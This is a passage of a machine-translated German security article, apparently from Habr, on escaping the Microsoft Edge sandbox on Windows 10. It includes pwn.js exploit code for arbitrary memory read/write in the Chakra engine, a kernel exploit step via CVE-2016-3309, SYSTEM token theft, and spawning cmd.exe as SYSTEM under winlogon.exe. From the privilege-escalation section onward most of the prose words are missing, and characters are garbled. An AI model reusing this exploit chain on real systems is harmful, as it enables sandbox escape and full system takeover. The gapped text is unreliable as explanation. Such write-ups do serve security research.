ist ein Schutzmechanismus, der die Ausnutzung bin√§rer Schwachstellen in Anwendungen im Benutzer- und Kernelmodus erschweren soll.  Die Arbeit dieses Mechanismus besteht in der Validierung indirekter Aufrufe, die verhindern, dass ein Angreifer den Ausf√ºhrungsthread abf√§ngt (z. B. durch √úberschreiben der Tabelle der virtuellen Funktionen). </blockquote><p>  Diese Technologie steuert nur indirekte Aufrufe, z. B. Methodenaufrufe aus der virtuellen Tabelle der Objektfunktionen.  R√ºcksprungadressen auf dem Stapel werden nicht gesteuert, und dies kann zum Erstellen von <code>ROP</code> Ketten verwendet werden.  Die zuk√ºnftige Verwendung von <code>ROP/JOP/COP</code> Ketten kann durch <code>Intel</code> neue Technologie von <code>Intel</code> behindert werden: die <code>Control-flow Enforcement Technology</code> ( <code>CET</code> ).  Diese Technologie besteht aus zwei Teilen: </p><br><ol><li>  <code>Shadow Stack</code> (Schattenstapel) - wird zur Steuerung von R√ºcksprungadressen und zum Schutz vor <code>ROP</code> Ketten verwendet. </li><li>  <code>Indirect Branch Tracking</code> ist eine Methode zum Schutz vor <code>JOP/COP</code> Ketten.  Es ist eine neue <code>ENDBRANCH</code> Anweisung, die alle g√ºltigen √úbergangsadressen f√ºr <code>call</code> und <code>jmp</code> Anweisungen <code>jmp</code> . </li></ol><br><h3 id="arbitrary-code-guard-acg">  Arbitrary Code Guard ( <code>ACG</code> ) </h3><br><blockquote>  <code>ACG</code> ist eine Technologie, die die dynamische Codegenerierung verhindert (es ist verboten, <code>rwx</code> Speicherbereiche mit <code>VirtaulAlloc</code> ) und deren √Ñnderungen (es ist unm√∂glich, <code>VirtaulAlloc</code> verf√ºgbaren Speicherbereich als ausf√ºhrbare Datei <code>VirtaulAlloc</code> ). </blockquote><p>  Dieser Schutz verhindert wie <code>CFG</code> nicht die Verwendung von <code>ROP</code> Ketten. </p><br><h3 id="appcontainer-isolation">  AppContainer-Isolierung </h3><br><blockquote>  AppContainer ist eine Microsoft-Technologie, mit der Sie einen Prozess isolieren k√∂nnen, indem Sie ihn in einer Sandbox-Umgebung ausf√ºhren.  Diese Technologie beschr√§nkt den Zugriff des Prozesses auf Anmeldeinformationen, Ger√§te, das Dateisystem, das Netzwerk, andere Prozesse und Fenster und zielt darauf ab, das Potenzial von sch√§dlicher Software zu minimieren, die in der Lage ist, beliebigen Code im Prozess auszuf√ºhren. </blockquote><p>  Dieser Schutz verkompliziert den Betriebsprozess erheblich.  Aus diesem Grund k√∂nnen wir keine ausf√ºhrbaren Dateien von Drittanbietern aufrufen oder auf vertrauliche Benutzerinformationen im Speicher oder auf Datentr√§gern zugreifen.  Dieser Schutz kann jedoch √ºberwunden werden, indem Schwachstellen bei der Implementierung der AppContainer-Sandbox verwendet werden oder indem die Berechtigungen durch Ausnutzen von Schwachstellen im Kernel des Betriebssystems erh√∂ht werden. </p><br><p>  Es ist erw√§hnenswert, dass <code>Microsoft</code> ein separates <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Belohnungsprogramm</a> f√ºr Techniken zur Umgehung von <code>security mitigation</code> hat.  Das Programm gibt an, dass die Wiederverwendung von ausf√ºhrbarem Code (das <code>ROP</code> Ketten ist eine Variation dieser Technik) nicht unter das Programm f√§llt, da  ist ein architektonisches Problem. </p><br><h3 id="ispolzovanie-pwnjs">  Verwenden von pwn.js </h3><br><p>  Aus einer Analyse aller Sicherheitstechnologien folgt, dass Sie die <code>AppContainer</code> Sandbox umgehen m√ºssen, um beliebigen Code ausf√ºhren zu k√∂nnen.  In diesem Artikel beschreiben wir eine Methode, die eine Sicherheitsanf√§lligkeit im <code>Windows</code> Kernel verwendet.  In diesem Fall k√∂nnen wir nur <code>JS</code> Code und <code>ROP</code> Ketten verwenden.  Das Schreiben eines Exploits f√ºr den Kernel mit nur <code>ROP</code> Ketten kann sehr schwierig sein.  Um diese Aufgabe zu vereinfachen, finden Sie eine Reihe von Gadgets, mit denen wir die erforderlichen <code>WinAPI</code> Methoden aufrufen k√∂nnen.  Gl√ºcklicherweise ist dies bereits in der Bibliothek <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><code>pwn.js</code></a> implementiert.  Wenn Sie nur die <code>read</code> und <code>write</code> f√ºr beliebiges Lesen und Schreiben beschrieben haben, erhalten Sie eine praktische <code>API</code> um die erforderlichen <code>WinAPI</code> Funktionen zu finden und aufzurufen.  <code>pwn.js</code> bietet auch ein praktisches Tool zum Arbeiten mit 64-Bit-Werten und Zeigern sowie Tools zum Arbeiten mit Strukturen. </p><br><p>  Betrachten Sie ein einfaches Beispiel.  Im vorherigen Schritt haben wir eine Kette von zwei verwandten <code>DataView</code> .  Um den Exploit vorzubereiten, m√ºssen Sie die folgende Klasse erstellen: </p><br><pre> <code class="javascript hljs"><span class="hljs-keyword"><span class="hljs-keyword">var</span></span> Exploit = (<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> ChakraExploit = pwnjs.ChakraExploit; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> Integer = pwnjs.Integer; <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">Exploit</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ ChakraExploit.call(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>); ... <span class="hljs-comment"><span class="hljs-comment">//  arbitrary address read/write    ... // DataView,         this.dv = ...; // DataView,     this.dv this.dv_offset = ...; //    Chakra.dll, ,     var vtable = ...; this.initChakra(vtable); } Exploit.prototype = Object.create(ChakraExploit.prototype); Exploit.prototype.constructor = Exploit; Exploit.prototype.set_dv_address = function(lo, hi) { this.dv_offset.setInt32(0x38, lo, true); this.dv_offset.setInt32(0x3c, hi, true); } Exploit.prototype.read = function (address, size) { this.set_dv_address(address.low, address.high); switch (size) { case 8: return new Integer(this.dv.getInt8(0, true), 0, true); case 16: return new Integer(this.dv.getInt16(0, true), 0, true); case 32: return new Integer(this.dv.getInt32(0, true), 0, true); case 64: return new Integer(this.dv.getInt32(0, true), this.dv.getInt32(4, true), true); } } Exploit.prototype.write = function (address, value, size) { this.set_dv_address(address.low, address.high); switch (size) { case 8: this.dv.setInt8(0, value.low, true); break; case 16: this.dv.setInt16(0, value.low, true); break; case 32: this.dv.setInt32(0, value.low, true); break; case 64: this.dv.setInt32(0, value.low, true); this.dv.setInt32(4, value.high, true); break; } } return Exploit; })();</span></span></code> </pre> <br><p>     ,      <code>MessageBoxA</code> : </p><br><pre> <code class="javascript hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">run</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">with</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Exploit()) { <span class="hljs-comment"><span class="hljs-comment">//alert('Chakra: ' + chakraBase.toString(16)); var MessageBoxA = importFunction('user32.dll', 'MessageBoxA', Int32); var GetActiveWindow = importFunction('user32.dll', 'GetActiveWindow', Int64); var hwnd = GetActiveWindow(); var ret = MessageBoxA(hwnd, new CString('PWNED'), new CString('PWNED'), 0); } }</span></span></code> </pre> <br><p>      : </p><br><p><img src="https://habrastorage.org/webt/vm/zb/t1/vmzbt1z0du0bnjto8mxpwzo9hac.png" alt="Pwned"></p><br><h2 id="shag-3-povyshenie-privilegiy-i-vyhod-iz-pesochnicy-s-pomoschyu-uyazvimosti-yadra">  3.           </h2><br><p>         <code>WinAPI</code> .         .      <code>CVE-2016-3309</code> .         [7]  [8],     <code>pwn.js</code> [2]    ,        <code>GDI</code> -.         [9], [10]  [11].              .        ,      .       ,                <code>AppContainer</code> ,          <code>pwn.js</code> .           <code>cmd.exe</code>    <code>SYSTEM</code> . </p><br><blockquote> GDI ‚Äî   Windows          , ,    . </blockquote><p> ,             . <code>JS</code> -     64-     <code>kernel_read_64</code>  <code>kernel_write_64</code> , .        Windows.           <code>BITMAP</code> ,    . <code>pwn.js</code>     .  <code>BITMAP</code>  , , : </p><br><pre> <code class="javascript hljs"><span class="hljs-keyword"><span class="hljs-keyword">var</span></span> BITMAP = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> StructType([ [<span class="hljs-string"><span class="hljs-string">'poolHeader'</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ArrayType(Uint32, <span class="hljs-number"><span class="hljs-number">4</span></span>)], <span class="hljs-comment"><span class="hljs-comment">// BASEOBJECT64 ['hHmgr', Uint64], ['ulShareCount', Uint32], ['cExclusiveLock', Uint16], ['BaseFlags', Uint16], ['Tid', Uint64], ['dhsurf', Uint64], ['hsurf', Uint64], ['dhpdev', Uint64], ['hdev', Uint64], ['sizlBitmap', SIZEL], ['cjBits', Uint32], ['pvBits', Uint64], ['pvScan0', Uint64], ]);</span></span></code> </pre> <br><p>  <code>Tid</code>       <code>KTHREAD</code>     , ,   ,   <code>EmpCheckErrataList</code> ,        .  ,        : </p><br><pre> <code class="javascript hljs">... var nt_EmpCheckErrataList_ptr = worker_bitmap_obj.Tid.add(<span class="hljs-number"><span class="hljs-number">0x2a8</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> nt_EmpCheckErrataList = kernel_read_64(nt_EmpCheckErrataList_ptr); <span class="hljs-comment"><span class="hljs-comment">/* g_config   ,         empCheckErrataList  WinDbg        : ? nt!EmpCheckErrataList - nt */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> ntoskrnl_base_address = nt_EmpCheckErrataList.sub( g_config.nt_empCheckErrataList_offset); ...</code> </pre> <br><p>    ,     <code>AppContainer</code>    .    <code>AppContainer</code>    <code>IsPackagedProcess</code>     ( <code>Process Environment Block</code> , <code>PEB</code> ),         .    <code>Access Token</code> ,         <code>AppContainer</code> .       <code>Access Token</code>  ,         . <code>Access Token</code>     ,     .     <code>EPROCESS</code>    <code>ActiveProcessLinks</code> ,       .   <code>PEB</code>     <code>EPROCESS</code> .          <code>PsInitialSystemProcess</code> ,   ,         <code>ActiveProcessLinks</code> . </p><br><p>    <code>Edge</code>    :      ,    <code>Edge</code>       .              <code>SYSTEM</code> .   , , <code>winlogon.exe</code> . </p><br><p>        <code>pwn.js</code>  : </p><br><pre> <code class="javascript hljs"><span class="hljs-comment"><span class="hljs-comment">//  PEB   var pinfo = _PROCESS_BASIC_INFORMATION.Ptr.cast(malloc(_PROCESS_BASIC_INFORMATION.size)); var pinfo_sz = Uint64.Ptr.cast(malloc(8)); NtQueryInformationProcess(GetCurrentProcess(), 0, pinfo, _PROCESS_BASIC_INFORMATION.size, pinfo_sz); var peb = pinfo.PebBaseAddress; /*    IsPackagedProcess       peb   char * */ var bit_field = peb[3]; bit_field = bit_field.xor(1 &lt;&lt; 4); peb[3] = bit_field; /*             WinDbg    .     : dt ntdll!_EPROCESS uniqueprocessid token activeprocesslinks           */ var ActiveProcessLinks = system_eprocess.add( g_config.ActiveProcessLinksOffset); var current_pid = GetCurrentProcessId(); var current_eprocess = null; var winlogon_pid = null; // winlogon.exe -  ,     cmd.exe var winlogon = new CString("winlogon.exe"); var image_name = malloc(16); var system_pid = kernel_read_64(system_eprocess.add( g_config.UniqueProcessIdOffset)); while(!current_eprocess || !winlogon_pid) { var eprocess = kernel_read_64(ActiveProcessLinks).sub( g_config.ActiveProcessLinksOffset); var pid = kernel_read_64(eprocess.add( g_config.UniqueProcessIdOffset)); //        //   Uint64.store( image_name.address, kernel_read_64(eprocess.add(g_config.ImageNameOffset)) ); Uint64.store( image_name.address.add(8), kernel_read_64(eprocess.add(g_config.ImageNameOffset + 8)) ); //   winlogon.exe    if(_stricmp(winlogon, image_name).eq(0)) { winlogon_pid = pid; } if (current_pid.eq(pid)) { current_eprocess = eprocess; } //        ActiveProcessLinks = eprocess.add( g_config.ActiveProcessLinksOffset); } //     var sys_token = kernel_read_64(system_eprocess.add(g_config.TokenOffset)); //          //   winlogon.exe var pi = malloc(24); memset(pi, 0, 24); var si = malloc(104 + 8); memset(si, 0, 104 + 8); Uint32.store(si.address, new Integer(104 + 8)); var args = WString("cmd.exe"); var AttributeListSize = Uint64.Ptr.cast(malloc(8)); InitializeProcThreadAttributeList(0, 1, 0, AttributeListSize); var lpAttributeList = malloc(AttributeListSize[0]); Uint64.store( si.address.add(104), lpAttributeList ); InitializeProcThreadAttributeList(lpAttributeList, 1, 0, AttributeListSize) var winlogon_handle = Uint64.Ptr.cast(malloc(8)); //       kernel_write_64(current_eprocess.add(g_config.TokenOffset), sys_token); /*        AppContainer,       winlogon.exe         winlogon.exe */ winlogon_handle[0] = OpenProcess(PROCESS_ALL_ACCESS, 0, winlogon_pid); UpdateProcThreadAttribute(lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, winlogon_handle, 8, 0, 0); CreateProcess(0, args, 0, 0, 0, EXTENDED_STARTUPINFO_PRESENT, 0, 0, si, pi);</span></span></code> </pre> <br><p>     : </p><br><p><img src="https://habrastorage.org/webt/r4/4j/lm/r44jlmrlc0reurbxe-rosf1cicu.png" alt="Finale"></p><br><p>   YouTube    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="></a>  ,     Microsoft Edge. </p><br><h2 id="itog">  Zusammenfassung </h2><br><p>   : </p><br><ul><li> ,       <code>Edge</code>   <code>Windows</code> ,   13   ,        <code>CVE-2017-0240</code>  ,   .          <code>CVE-2016-3309</code> . </li><li>      <code>JS</code> </li><li>    666    <code>JS</code> </li><li>   :  <code>cmd.exe</code>    <code>SYSTEM</code> ,        </li></ul><br><p>   ,         ,                 .  ,       ,         .        . </p><br><h2 id="materialy">  Material </h2><br><ol><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Liu Jin ‚Äî The Advanced Exploitation of 64-bit Edge Browser Use-After-Free Vulnerability on Windows 10</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Andrew Wesie, Brian Pak ‚Äî 1-Day Browser &amp; Kernel <br> Exploitation</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Natalie Silvanovich ‚Äî The ECMA and the Chakra. Hunting bugs in the Microsoft Edge Script Engine</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Natalie Silvanovich ‚Äî Your Chakra Is Not Aligned. Hunting bugs in the Microsoft Edge Script Engine</a> </li><li> <a href="">phoenhex team ‚Äî cve-2018-8629-chakra.js</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Quarkslab ‚Äî Exploiting MS16-145: MS Edge TypedArray.sort Use-After-Free (CVE-2016-7288)</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Exploiting MS16-098 RGNOBJ Integer Overflow on Windows 8.1 x64 bit by abusing GDI objects</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Siberas ‚Äî Kernel Exploitation Case Study ‚Äî "Wild" Pool Overflow on Win10 x64 RS2 (CVE-2016-3309 Reloaded)</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Saif El-Sherei ‚Äî Demystifying Windows Kernel Exploitation by Abusing GDI Objects</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Diego Juarez ‚Äî Abusing GDI for ring0 exploit primitives</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Nicolas A. Economou ‚Äî Abusing GDI for ring0 exploit <br> primitives: Evolution</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">pwn.js</a> </li></ol></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/de455594/">https://habr.com/ru/post/de455594/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../de455584/index.html">Kundenspezifische Interviews mit den internen Kr√§ften des Unternehmens: durch Fehler zu Entdeckungen</a></li>
<li><a href="../de455586/index.html">Vorlesungsreihe √ºber Robotik von Professor Gregor Sch√∂ner, Direktor des Instituts f√ºr Neuroinformatik (INI) Bochum</a></li>
<li><a href="../de455588/index.html">Wie Sie Ihre Gemeinde erziehen, um nicht mit einem Tamburin zu tanzen</a></li>
<li><a href="../de455590/index.html">MVCC in PostgreSQL-8. Einfrieren</a></li>
<li><a href="../de455592/index.html">Viren, die Industrieunternehmen als Bedrohung f√ºr die physische Sicherheit angreifen</a></li>
<li><a href="../de455596/index.html">DevConfX :: Management - Berichte von Managern in einfachen Worten</a></li>
<li><a href="../de455598/index.html">Aktualisieren Sie Exim dringend auf 4.92 - es liegt eine aktive Infektion vor</a></li>
<li><a href="../de455600/index.html">Die 3DEXPERIENCE-Plattform hilft bei der Schaffung √∂ffentlicher Verkehrsmittel der Zukunft</a></li>
<li><a href="../de455602/index.html">Das Provozieren von Browsern st√ºrzt mit Verhaltensfuzzing ab</a></li>
<li><a href="../de455604/index.html">Verantwortlich f√ºr die Verwaltung der Windows-Konfiguration. Erfolgsgeschichte</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>